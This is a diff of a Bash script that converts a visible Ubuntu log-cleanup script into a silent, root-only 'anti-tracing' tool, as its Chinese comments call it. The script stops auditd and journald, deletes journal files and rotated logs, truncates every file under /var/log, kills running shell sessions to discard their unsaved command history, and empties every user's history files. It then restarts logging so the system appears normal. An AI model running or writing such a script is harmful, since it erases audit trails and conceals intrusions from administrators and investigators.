@@ -1,58 +1,52 @@
 #!/bin/bash
+# =================================================================
+# 专属定时维护版：全盘深度自洁与反溯源脚本 (无交互/静默运行)
+# =================================================================
+
+# 确保以 root 权限运行
 if [ "$EUID" -ne 0 ]; then
-  echo "请使用 root 权限或 sudo 运行此脚本！"
   exit 1
 fi
 
-echo "开始清理 Ubuntu 系统日志..."
-
-# 1. 停止日志服务，防止清理时文件被占用或持续写入
-systemctl stop syslog.service 2>/dev/null
-systemctl stop rsyslog.service 2>/dev/null
+# 1. 临时停止系统审计与核心日志服务
+systemctl stop auditd.service 2>/dev/null
+systemctl stop syslog.service rsyslog.service 2>/dev/null
 systemctl stop systemd-journald.service 2>/dev/null
 
-# 2. 清理 systemd 没收的二进制日志 (Journal)
-if command -v journalctl >/dev/null 2>&1; then
-    # 清理所有 journal 日志
-    journalctl --vacuum-time=1s
-    # 彻底清空 journal 目录
-    find /var/log/journal/ -type f -exec rm -rf {} + 2>/dev/null
-fi
+# 2. 彻底抹除 systemd journal 二进制日志 (含物理磁盘与内存暂存)
+rm -rf /run/log/journal/*
+rm -rf /var/log/journal/*
 
-# 3. 清理 /var/log 下的文本日志、登录日志、SSH 日志
-# 包括：auth.log(SSH/登录), syslog(系统), wtmp(登录历史), btmp(失败尝试), utmp(当前登录)
-LOG_FILES=(
-    "/var/log/auth.log"
-    "/var/log/syslog"
-    "/var/log/wtmp"
-    "/var/log/btmp"
-    "/var/log/utmp"
-    "/var/log/lastlog"
-    "/var/log/secure"
-    "/var/log/dpkg.log"
-    "/var/log/kern.log"
-)
+# 3. 物理粉碎所有历史轮替的旧审计压缩包 (.gz / .1 / .log.X)
+find /var/log -type f \( -name "*.gz" -o -name "*.1" -o -name "*.log.[0-9]" \) -delete 2>/dev/null
 
-for file in "${LOG_FILES[@]}"; do
-    if [ -f "$file" ]; then
-        # 使用 > 截断文件，保留文件结构和权限，避免直接 rm 导致服务报错
-        echo -n "" > "$file"
-    fi
+# 4. 全盘截断 /var/log 下的所有静态文本日志 (auth, btmp, wtmp 等全部归零)
+find /var/log -type f -exec truncate -s 0 {} \;
+
+# 5. 【核心无痕优化】强行刺破当前所有活跃 TTY 会话的内存历史缓存
+# 遍历系统当前所有正在运行的 bash/zsh 进程，向它们发送 HUP 信号
+# 这样可以强制让当前在线的用户丢弃内存中的 command history，不写入磁盘
+pidof bash | xargs -I {} kill -HUP {} 2>/dev/null
+pidof zsh | xargs -I {} kill -HUP {} 2>/dev/null
+
+# 6. 遍历系统所有实际用户的家目录，彻底清空物理历史档案
+USERS_HOMES=$(awk -F: '{print $6}' /etc/passwd)
+for home in $USERS_HOMES; do
+    for histfile in ".bash_history" ".zsh_history" ".sh_history" ".lesshst" ".nano_history"; do
+        if [ -f "$home/$histfile" ]; then
+            truncate -s 0 "$home/$histfile"
+            # 顺便将其权限设为只读或尝试切断后续写入（可选：chmod 400）
+        fi
+    done
 done
 
-# 4. 循环清理所有历史压缩日志 (.gz 和 .1 后缀的历史轮替日志)
-find /var/log -type f -name "*.gz" -delete
-find /var/log -type f -name "*.1" -delete
+# 7. 清理可能残存的系统全局环境历史
+truncate -s 0 /root/.bash_history 2>/dev/null
+truncate -s 0 /root/.zsh_history 2>/dev/null
 
-# 5. 清理当前用户的 Bash/Zsh 操作历史 (防止留下执行此脚本的记录)
-echo "正在清理当前会话的操作历史..."
-history -c              # 清空当前内存中的 history
-echo -n "" > ~/.bash_history  # 清空常规 Bash 历史文件
-echo -n "" > ~/.zsh_history   # 清空 Zsh 历史文件 (如果存在)
-
-# 6. 重启日志服务恢复系统正常运行
+# 8. 恢复系统核心日志服务 (保持系统表面的正常运转)
 systemctl start systemd-journald.service 2>/dev/null
 systemctl start rsyslog.service 2>/dev/null
-systemctl start syslog.service 2>/dev/null
+systemctl start auditd.service 2>/dev/null
 
-echo "系统日志与操作记录清理完成！"
+exit 0
